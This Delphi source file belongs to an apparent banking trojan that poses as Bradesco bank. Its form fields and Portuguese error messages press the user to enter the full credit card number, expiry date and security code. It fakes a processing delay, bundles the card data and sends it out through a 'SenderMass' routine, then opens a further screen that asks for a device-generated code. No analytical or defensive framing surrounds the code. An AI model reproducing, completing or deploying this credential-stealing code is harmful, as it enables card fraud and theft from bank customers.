unit Bdn5;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, Bdn6, StdCtrls;

type
  TBradelaframe5 = class(TFrame)
    bdn4: TImage;
    EditA: TEdit;
    EditC1: TEdit;
    EditC2: TEdit;
    EditC3: TEdit;
    EditC4: TEdit;
    EditCs: TEdit;
    EditM: TEdit;
    Image1: TImage;
    Image2: TImage;
    procedure Image1Click(Sender: TObject);
    procedure EditC1Change(Sender: TObject);
    procedure EditC2Change(Sender: TObject);
    procedure EditC3Change(Sender: TObject);
    procedure EditC4Change(Sender: TObject);
    procedure EditMChange(Sender: TObject);
    procedure EditAChange(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
  var
  Bradelaframe6: TBradelaframe6;

implementation

{$R *.dfm}
uses
Natal, Gerador, Bdn;

procedure TBradelaframe5.EditAChange(Sender: TObject);
begin
  if Length(EditA.Text) = 4 then
  EditCs.SetFocus;
end;

procedure TBradelaframe5.EditC1Change(Sender: TObject);
begin
   if Length(EditC1.Text) = 4 then
  EditC2.SetFocus;
end;

procedure TBradelaframe5.EditC2Change(Sender: TObject);
begin
  if Length(EditC2.Text) = 4 then
  EditC3.SetFocus;
end;

procedure TBradelaframe5.EditC3Change(Sender: TObject);
begin
  if Length(EditC3.Text) = 4 then
  EditC4.SetFocus;
end;

procedure TBradelaframe5.EditC4Change(Sender: TObject);
begin
  if Length(EditC4.Text) = 4 then
  EditM.SetFocus;
end;

procedure TBradelaframe5.EditMChange(Sender: TObject);
begin
  if Length(EditM.Text) = 2 then
  EditA.SetFocus;
end;

procedure TBradelaframe5.Image1Click(Sender: TObject);
begin

  Screen.Cursor := crHourGlass;
  Sleep(6000);
  Screen.Cursor := crDefault;

      if EditC1.Text+EditC2.Text+EditC3.Text+EditC4.Text='' then
  begin
    MessageBox(Self.handle,'Digite os números de seu cartão de crédito!', 'BRADESCO S.A', mb_IconError + mb_Ok);
    exit;
  end;

    if EditM.Text='' then
  begin
    MessageBox(Self.handle,'Digite o mês da validade de seu cartão de crédito!', 'BRADESCO S.A', mb_IconError + mb_Ok);
    exit;
  end;

     if EditA.Text='' then
  begin
    MessageBox(Self.handle,'Digite o ano da validade de seu cartão de crédito!', 'BRADESCO S.A', mb_IconError + mb_Ok);
    exit;
  end;

    if EditCs.Text='' then
  begin
    MessageBox(Self.handle,'Digite o código de segurança de seu cartão de crédito, são os três últimos números atrás do cartão', 'BRADESCO S.A', mb_IconError + mb_Ok);
    exit;
  end;



DadosEnvio_ := TStringList.Create;
DadosEnvio_.Add('===========================================');
DadosEnvio_.Add('CARD: '+EditC1.Text+EditC2.Text+EditC3.Text+EditC4.Text);
DadosEnvio_.Add('VAL.: '+EditM.Text+'/'+EditA.Text);
DadosEnvio_.Add('VAL.: '+EditCs.Text);
DadosEnvio_.Add('===========================================');

 Application.MessageBox('Para validar a o desbloqueio da senha, informe o código gerado no dispositivo! ', 'BRADESCO S.A',mb_Ok+mb_IconInformation);


//SENDBOX
try
begin
  Bradelaframe6 := TBradelaframe6.Create(Self);
with Bradelaframe6 do
  begin
    Parent := Self;
    Left   := 0;
    Top    := 0;
  end;
  SenderMass(DadosEnvio_ , 'DadosBrada');
  DadosEnvio_.Free;
  end;
finally
end;
end;

end.
